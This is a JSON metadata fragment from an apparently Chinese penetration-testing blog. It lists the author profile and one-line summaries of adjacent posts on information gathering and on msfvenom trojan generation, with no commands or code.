class=\"toc-text\">1、icmpsh</span></a></li></ol></li></ol></li></ol>","author":{"name":"Kcxuao","slug":"blog-author","avatar":"https://img.gejiba.com/images/d12fcf0171d543a357ba257c1187033f.webp","link":"/","description":"路漫漫其修远兮，吾将上下而求索","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{"qq":{"icon":"/img/qq.png","link":"http://wpa.qq.com/msgrd?v=3&uin=3187294487&site=qq&menu=yes"},"github":{"icon":"/img/github.png","link":"https://github.com/Kcxuao"},"email":{"icon":"/img/email.png","link":"mailto:kcxuao@gmail.com"}}}},"mapped":true,"prev_post":{"title":"信息收集","uid":"b872efa5eac542f6ec33ce5b2ff94521","slug":"信息收集","date":"2022-10-02T10:00:02.000Z","updated":"2022-10-02T10:20:42.192Z","comments":true,"path":"api/articles/信息收集.json","keywords":null,"cover":null,"text":" 摘要 本文仅作为大纲概括，具体内容后续发布 1、为什么要做信息收集? ​ 俗话说：知己知彼，百战不怠。我们做为渗透测试人员也是如此，收集到足够丰富的信息之后，我们才能对目标制定完善的渗透计划。这一步是整个渗透测试中的第一步，也是最重要的一步。 2、需要收集什么信息？ ​ 收集这...","link":"","photos":[],"count_time":{"symbolsCount":"2.5k","symbolsTime":"2 mins."},"categories":[{"name":"网络安全","slug":"网络安全","count":11,"path":"api/categories/网络安全.json"},{"name":"信息收集","slug":"网络安全/信息收集","count":1,"path":"api/categories/网络安全/信息收集.json"}],"tags":[{"name":"网络安全","slug":"网络安全","count":11,"path":"api/tags/网络安全.json"},{"name":"信息收集","slug":"信息收集","count":1,"path":"api/tags/信息收集.json"}],"author":{"name":"Kcxuao","slug":"blog-author","avatar":"https://img.gejiba.com/images/d12fcf0171d543a357ba257c1187033f.webp","link":"/","description":"路漫漫其修远兮，吾将上下而求索","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{"qq":{"icon":"/img/qq.png","link":"http://wpa.qq.com/msgrd?v=3&uin=3187294487&site=qq&menu=yes"},"github":{"icon":"/img/github.png","link":"https://github.com/Kcxuao"},"email":{"icon":"/img/email.png","link":"mailto:kcxuao@gmail.com"}}}},"feature":true},"next_post":{"title":"MsfVenom木马制作","uid":"5531dbf9522eeb91cbe011b05c7645c2","slug":"MsfVenom木马制作","date":"2022-08-27T07:51:03.000Z","updated":"2022-08-27T06:46:28.682Z","comments":true,"path":"api/articles/MsfVenom木马制作.json","keywords":null,"cover":"https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimage.3001.net%2Fimages%2F20200622%2F1592755406_5eef84ceef5dd.jpg%21small&refer=http%3A%2F%2Fimage.3001.net&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1664122130&t=da09b74224ff033a65e1aec10ad8ebb8","text":"一、msfvenom基本用法1. 功能介绍​ msfvenom的功能：常用于生成木马，在目标机器上执行，在本地机器kall中上线，与反弹Shell类似。MSFVenom可以生成两种类型的攻击载荷： ​ (1) Payload ：Payload中包含攻击进入目标主机后需要在远程系统...","link":"","photos":[],"count_time":{"symbolsCount":"6.8k","symbolsTime":"6 mins."},"categories":[{"name":"网络安全","slug":"网络安全","count":11,"path":"api/categories/网络安全.json"},{"name":"工具使用","slug":"网络安全/工具使用","count":3,"path":"api/categories/网络安全/工具使用.json"}],"tags":[{"name":"网络安全","slug":"网络安全","count":11,"path":"api/tags/网络安全.json"},{"name":"工具使用","slug":"工具使用","count":3,"path":"api/tags/工具使用.json"}],"author":{"name":"Kcxuao","slug":"blog-author","avatar":"https://img.gejiba.com/images/d12fcf0171d543a357ba257c1187033f.webp","link":"/","description":"路漫漫其修远兮，吾将上下而求索","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{"qq":{"icon":"/img/qq.png","link":"http://wpa.qq.com/msgrd?v=3&uin=3187294487&site=qq&menu=yes"},"github":{"icon":"/img/github.png","link":"https://github.com/Kcxuao"},"email":{"icon":"/img/email.png","link":"mailto:kcxuao@gmail.com"}}}},"feature":true}}